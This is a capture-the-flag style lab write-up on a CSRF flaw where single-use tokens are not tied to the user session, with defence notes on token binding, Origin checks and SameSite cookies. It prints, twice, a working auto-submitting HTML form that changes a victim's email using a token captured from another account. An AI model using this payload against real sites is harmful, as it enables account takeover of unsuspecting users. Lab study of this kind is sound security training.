# CSRF where token is not tied to user session

*A concise write‑up using my original steps (verbatim flow) with small, accurate notes. For authorized lab use only.*

---

## 🎯 Goal
**Change another user’s email address** by abusing a single‑use CSRF token that isn’t bound to the submitting user/session.

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** change other user email.
2. We got **2 accounts**, meaning we already have more ways to maneuver.
3. Since it's a lab, and we get two accounts instantly I will go for the obvious.
4. Notice the **change‑email** request has a **one‑time CSRF** that gets regenerated each time.
5. We can try to **regenerate a CSRF** by sending a request and then **dropping it** (capture the token without completing the change).
6. Take the **CSRF token** to the **other account** and try to change the mail → **worked.**
7. Build an **auto‑submit form** including the captured CSRF token:
   ```html
   <form id="ex" action="https://0a1e004e036cdee380b703e6004a00c2.web-security-academy.net/my-account/change-email" method="POST">
     <input name="email" value="email@gmail.com">
     <input name="csrf" value="RJtiUHOcCn3dISmA0rrOPQKQ7AZqUMKZ">
   </form>

   <script>document.getElementById("ex").submit()</script>
   ```
8. **Lab solved!** ✅

---

## 🧠 Why This Works (minimal notes)

- The CSRF token is **single‑use** but **not tied to the user/session** who requested it. That means a token **minted in Account A** is accepted when **submitted by Account B**.
- Proper defenses must **bind tokens** to a stable user/session context (and often to a specific action + expiry), and verify **Origin/Referer**. Tokens alone are insufficient if they’re **transferable** across sessions.
- Browser will **include the victim’s cookies** on cross‑site form POST, authenticating the request even though the token originated elsewhere.

> If the target used `SameSite=Lax/Strict` cookies or strict Origin checks, cross‑site form posts could be blocked/rejected. This lab accepts them.

---

## 🧾 Raw exploit (kept exactly)
```html
<form id="ex" action="https://0a1e004e036cdee380b703e6004a00c2.web-security-academy.net/my-account/change-email" method="POST">
  <input name="email" value="email@gmail.com">
  <input name="csrf" value="RJtiUHOcCn3dISmA0rrOPQKQ7AZqUMKZ">
</form>

<script>document.getElementById("ex").submit()</script>
```

---

## 🏁 Result
- Captured a fresh CSRF token from one account and **reused it in another**, proving the token isn’t bound to the user/session. Email change succeeds. **Solved. ✅**
